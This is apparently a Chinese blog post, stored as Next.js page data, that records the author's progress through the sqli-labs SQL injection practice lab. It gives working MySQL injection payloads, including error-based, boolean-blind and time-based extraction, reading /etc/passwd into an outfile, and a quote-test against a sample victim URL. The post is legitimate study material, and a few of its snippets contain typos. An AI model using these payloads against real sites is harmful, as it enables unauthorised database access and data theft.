1:HL["/_next/static/media/2aaf0723e720e8b9-s.p.woff2",{"as":"font","type":"font/woff2"}]
2:HL["/_next/static/css/a92540424b22222c.css",{"as":"style"}]
0:[[["",{"children":["posts",{"children":[["slug","sqli-labs","c"],{"children":["__PAGE__?{\"slug\":[\"sqli-labs\"]}",{}]}]}]},"$undefined","$undefined",true],"$L3",[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/a92540424b22222c.css","precedence":"next"}]],["$L4",["$","meta",null,{"name":"next-size-adjust"}]]]]]
5:I{"id":"350","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-74b271c1b230be62.js"],"name":"ThemeProvider","async":false}
6:I{"id":"414","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-74b271c1b230be62.js"],"name":"","async":false}
7:I{"id":"9544","chunks":["272:static/chunks/webpack-73f4e2df0712f57f.js","667:static/chunks/2443530c-ac8981f6a5707b30.js","139:static/chunks/139-1dec130228ce3944.js"],"name":"","async":false}
8:I{"id":"99","chunks":["272:static/chunks/webpack-73f4e2df0712f57f.js","667:static/chunks/2443530c-ac8981f6a5707b30.js","139:static/chunks/139-1dec130228ce3944.js"],"name":"","async":false}
a:I{"id":"1234","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-74b271c1b230be62.js"],"name":"Analytics","async":false}
3:[["$","html",null,{"lang":"en","children":["$","body",null,{"className":"antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4","children":["$","$L5",null,{"attribute":"class","defaultTheme":"system","enableSystem":true,"children":[["$","div",null,{"className":"my-max mx-auto py-10 px-4","children":[["$","header",null,{"children":["$","div",null,{"className":"my-flex","children":["$","nav",null,{"className":"nav-ml text-sm font-medium space-x-6","children":[["$","$L6",null,{"href":"/","children":"Home"}],["$","$L6",null,{"href":"/about","children":"About"}]]}]}]}],["$","main",null,{"children":["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L8",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","posts","children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L8",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","posts","children",["slug","sqli-labs","c"],"children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L8",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$L9",null],"segment":"__PAGE__?{\"slug\":[\"sqli-labs\"]}"},"styles":[]}],"segment":["slug","sqli-labs","c"]},"styles":[]}],"segment":"posts"},"styles":[]}]}]]}],["$","$La",null,{}]]}]}]}],null]
4:[[["$","meta",null,{"charSet":"utf-8"}],["$","title",null,{"children":"sqli-labs挑战记录"}],null,null,null,null,null,null,null,null,null,["$","meta",null,{"name":"viewport","content":"width=device-width, initial-scale=1"}],null,null,null,null,null,null,null,null,null,null,[]],[null,null,null,null],null,null,[null,null,null,null,null],null,null,null,null,[null,[["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon","sizes":"any"}]],[],null]]
b:I{"id":"1753","chunks":["110:static/chunks/110-fa1ef238a86eb8d6.js","49:static/chunks/app/posts/[...slug]/page-b5cd823d07a42590.js"],"name":"","async":false}
9:[["$","$Lb",null,{}],["$","article",null,{"className":"py-6 prose post-prose dark:prose-invert","children":[["$","div",null,{"className":"post-title","children":"sqli-labs挑战记录"}],["$","time",null,{"dateTime":"2018-02-08T21:17:13.000Z","className":"post-time","children":"February 8, 2018"}],"$undefined",["$","div",null,{"className":"js-toc-content","children":[["$","h1",null,{"id":"前言","children":"前言"}],"\n",["$","p",null,{"children":[["$","a",null,{"href":"https://github.com/Audi-1/sqli-labs","children":"sqli-labs"}],"是Github上一个印度大叔",["$","a",null,{"href":"https://github.com/Audi-1","children":"Audi-1"}],"的一个项目，用PHP和MySQL搭建的一个学习SQLI注入的实验平台。印度大叔有亲自自己录过教学视频，只是口音有点重，放在了Youtube上面（",["$","a",null,{"href":"https://www.youtube.com/playlist?list=PLkiAz1NPnw8qEgzS7cgVMKavvOAdogsro","children":"这里"}],"）。我在此记录一下学习过程中的东西，欢迎交流。"]}],"\n",["$","h1",null,{"id":"less-1---4","children":"Less 1 - 4"}],"\n",["$","p",null,{"children":"当找到注入点的时候，可以用order by 1/2/3来知道select中共有多少列。如果order by 不管用，可以用union select 1,2,3来判断，因为union要求左右两张表是一样的列数。"}],"\n",["$","p",null,{"children":"当页面不显示数据返回的结果，但是有错误提示，可以利用错误提示将数据dump出来"}],"\n",["$","p",null,{"children":"select concat((select database()))"}],"\n",["$","p",null,{"children":["原理解释",["$","a",null,{"href":"http://www.cnblogs.com/xdans/p/5412468.html","children":"Mysql报错注入原理分析(count()、rand()、group by)"}],"\nselect count(*), concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)",["$","em",null,{"children":"2))a from information_schema.tables group by a;\n美化版\nSELECT\ncount("}],"),\nconcat(\n0x3a,\n0x3a,\n(SELECT USER()),\n0x3a,\n0x3a,\nfloor(rand(0) * 2)\n) a\nFROM\ninformation_schema. TABLES\nGROUP BY\na;"]}],"\n",["$","p",null,{"children":["所以可以进阶一下，查看更多信息\nselect count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,floor(rand(0)",["$","em",null,{"children":"2))a from information_schema.tables group by a;\n美化版\nSELECT\ncount("}],"),\nconcat(\n0x3a,\n0x3a,\n(\nSELECT\ntable_name  //此处无法用group_concat\nFROM\ninformation_schema. TABLES\nWHERE\ntable_schema = DATABASE ()\nLIMIT 0,\n1\n),\n0x3a,\n0x3a,\nfloor(rand(0) * 2)\n) a\nFROM\ninformation_schema. TABLES\nGROUP BY\na;\n改变limit就可以遍历了，但是子查询中不知道为什么用group_concat就不会错误，所以只能一个个改变limit来。"]}],"\n",["$","p",null,{"children":"以下还有两种方式也是一样的效果。\nselect min(@a:=1) from information_schema.tables group by concat(version(),@a:=(@a+1)%2)"}],"\n",["$","p",null,{"children":"select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;"}],"\n",["$","p",null,{"children":"当不能使用select * from 的时候，比如后面有and 语句。可以用盲注。"}],"\n",["$","h1",null,{"id":"less-8","children":"less-8"}],"\n",["$","p",null,{"children":"盲注，这种情况没有错误提时，只能通过true and false来判断。\n需要借助的函数是 ascii(), substr(), length() 这样来枚举一个字符串的长度，每一个字母来获取需要的信息。\n比如"}],"\n",["$","pre",null,{"children":["$","code",null,{"children":"select ascii(substr(database(), 3, 1)) <100 \nand ascii(substr((select table_name for information_schema.tables limit 1), 3 ,1)) < 100\n"}]}],"\n",["$","h1",null,{"id":"less-9","children":"less-9"}],"\n",["$","p",null,{"children":"上一题的盲注是基于真假值得。但是这一题的sql结果无论是否存在与否，网页前端都是同一个效果，所以我们这一题的盲注要通过一个小技巧，叫做时间盲注。要用到sleep()函数。\n可以构造构造如下的payload"}],"\n",["$","pre",null,{"children":["$","code",null,{"children":"select ascii(substr(databse(), 3,1 )) = 90 and sleep(10)\nselect if((select database())=\"security\", sleep(10), null)\nselect if((select database() like \"sec%\"), sleep(10), null)\n"}]}],"\n",["$","p",null,{"children":"假如第一个字母是正确的话，那么我们网页就等等待10秒才返回结果，如果错误就立即返回了。通过这两个时间的差距，我们就可以判断。"}],"\n",["$","h1",null,{"id":"using-outfile-lesst-7","children":"using outfile (lesst-7)"}],"\n",["$","pre",null,{"children":["$","code",null,{"children":"select * from users into outfile \"/tmp/test.txt\"\nselect * from users limit 1 into dumpfile \"/tmp/test.txt\"\n"}]}],"\n",["$","p",null,{"children":"outfile可以多行，dumpfile只能一行"}],"\n",["$","pre",null,{"children":["$","code",null,{"children":"select load_file(\"/etc/passwd\") into outfile \"/tmp/test.txt\"\n"}]}],"\n",["$","p",null,{"children":"路径名一般用网站的目录，至于网站的目录就用其他方法来猜测和确定。"}],"\n",["$","h1",null,{"id":"less-12","children":"less-12"}],"\n",["$","p",null,{"children":"从11开始，就是post方法的注入了。\n这里也是基于页面的Mysql错误提示来猜测SQL的写法。"}],"\n",["$","h1",null,{"id":"less-14","children":"less 14"}],"\n",["$","p",null,{"children":"因为这里成功登入之后没有任何有用的信息返回，但是错误SQL的时候页面会有错误提示，所以我们要用双重注入。"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-sql","children":["\" and (select 1 from (select count(*), (concat(\"",["$","span",null,{"className":"hljs-operator","children":"~"}],"\",version(),\"",["$","span",null,{"className":"hljs-operator","children":"~"}],"\",floor(rand(0)*2)))c from information_schema.tables GROUP BY c)a) # \n"]}]}],"\n",["$","h1",null,{"id":"less-16","children":"less 16"}],"\n",["$","p",null,{"children":"这题是盲注"}],"\n",["$","h1",null,{"id":"less-17","children":"less 17"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-sql","children":[["$","span",null,{"className":"hljs-keyword","children":"update"}]," users ",["$","span",null,{"className":"hljs-keyword","children":"set"}]," password",["$","span",null,{"className":"hljs-operator","children":"="}],["$","span",null,{"className":"hljs-string","children":"'$psd'"}]," ",["$","span",null,{"className":"hljs-keyword","children":"where"}]," username",["$","span",null,{"className":"hljs-operator","children":"="}],["$","span",null,{"className":"hljs-string","children":"'$uname'"}],"\n"]}]}],"\n",["$","p",null,{"children":"这题就需要用双重注入"}],"\n",["$","h1",null,{"id":"less-18","children":"less 18"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-sql","children":[" ",["$","span",null,{"className":"hljs-string","children":"'::1'"}],", ",["$","span",null,{"className":"hljs-string","children":"'admin'"}],")",["$","span",null,{"className":"hljs-string","children":"' at line 1\n insert into uagents (agents, ip , uname) value('', '', '"}],"admin",["$","span",null,{"className":"hljs-string","children":"')\n insert into uagents(agent, ip, uname) value('' or 1 = '"}],["$","span",null,{"className":"hljs-number","children":"1"}],["$","span",null,{"className":"hljs-string","children":"', '"}],"::",["$","span",null,{"className":"hljs-number","children":"1"}],["$","span",null,{"className":"hljs-string","children":"', '"}],"admin",["$","span",null,{"className":"hljs-string","children":"')\n"}]]}]}],"\n",["$","p",null,{"children":"这里应该用双重注入"}],"\n",["$","h1",null,{"id":"less-20","children":"less 20"}],"\n",["$","p",null,{"children":"基于cookie的注入， 这里其实也就是另一种形式的基于错误的注入。"}],"\n",["$","h1",null,{"id":"less-21","children":"less 21"}],"\n",["$","p",null,{"children":"和上面一样，只是加多一道加密的过程。"}],"\n",["$","h1",null,{"id":"有趣小知识","children":"有趣小知识"}],"\n",["$","ol",null,{"children":["\n",["$","li",null,{"children":["可以通过一个有趣的小测试来识别是否存在单引号漏洞：\n向Web服务器发送下面两个请求：\na.  ",["$","a",null,{"href":"http://www.victim.com/showproducts.php?category=bikes","children":"http://www.victim.com/showproducts.php?category=bikes"}],"\nb.  ",["$","a",null,{"href":"http://www.victim.com/showproducts.php?category=bi'%7C%7C'kes","children":"http://www.victim.com/showproducts.php?category=bi'||'kes"}],"\n在Microsoft SQL Server中与之等价的请求为：\na.  ",["$","a",null,{"href":"http://www.victim.com/showproducts.php?category=bikes","children":"http://www.victim.com/showproducts.php?category=bikes"}],"\nb.  ",["$","a",null,{"href":"http://www.victim.com/showproducts.php?category=bi'+'kes","children":"http://www.victim.com/showproducts.php?category=bi'+'kes"}],"\n在MYSQL中与之等价的请求为（请注意两个单引号之间的空格）：\na.  ",["$","a",null,{"href":"http://www.victim.com/showproducts.php?category=bikes","children":"http://www.victim.com/showproducts.php?category=bikes"}],"\nb.  ",["$","a",null,{"href":"http://www.victim.com/showproducts.php?category=bi","children":"http://www.victim.com/showproducts.php?category=bi"}],"' 'kes\n如果两个请求的结果相同，那么很可能存在SQL注入漏洞。"]}],"\n"]}]]}]]}]]
